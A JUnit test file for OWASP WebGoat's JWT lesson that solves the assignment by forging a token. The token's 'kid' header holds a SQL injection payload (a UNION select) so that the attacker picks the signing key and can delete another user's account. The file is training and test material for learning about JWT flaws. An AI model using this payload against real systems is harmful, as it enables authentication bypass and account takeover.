package org.owasp.webgoat.lessons.jwt;

import static org.hamcrest.Matchers.is;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import io.jsonwebtoken.Jwts;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import org.hamcrest.CoreMatchers;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.owasp.webgoat.container.SecretsApi;
import org.owasp.webgoat.container.plugins.LessonTest;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

public class JWTFinalEndpointTest extends LessonTest {

  private static final String TOKEN_JERRY = SecretsApi.getSecret("tokenjerry");

  @BeforeEach
  public void setup() {
    when(webSession.getCurrentLesson()).thenReturn(new JWT());
    this.mockMvc = MockMvcBuilders.webAppContextSetup(this.wac).build();
  }

  @Test
  public void solveAssignment() throws Exception {
    String key = "deletingTom";
    Map<String, Object> claims = new HashMap<>();
    claims.put("username", "Tom");
    String token =
        Jwts.builder()
            .setHeaderParam(
                "kid", "hacked' UNION select '" + key + "' from INFORMATION_SCHEMA.SYSTEM_USERS --")
            .setIssuedAt(new Date(System.currentTimeMillis() + TimeUnit.DAYS.toDays(10)))
            .setClaims(claims)
            .signWith(io.jsonwebtoken.SignatureAlgorithm.HS512, key)
            .compact();
    mockMvc
        .perform(MockMvcRequestBuilders.post("/JWT/final/delete").param("token", token).content(""))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.lessonCompleted", is(true)));
  }

  @Test
  public void withJerrysKeyShouldNotSolveAssignment() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/JWT/final/delete")
                .param("token", TOKEN_JERRY)
                .content(""))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath(
                "$.feedback", CoreMatchers.is(messages.getMessage("jwt-final-jerry-account"))));
  }

  @Test
  public void shouldNotBeAbleToBypassWithSimpleToken() throws Exception {
    mockMvc
        .perform(
            MockMvcRequestBuilders.post("/JWT/final/delete")
                .param("token", SecretsApi.getSecret("jwttokenjerry"))
                .content(""))
        .andExpect(status().isOk())
        .andExpect(
            jsonPath("$.feedback", CoreMatchers.is(messages.getMessage("jwt-invalid-token"))));
  }
}
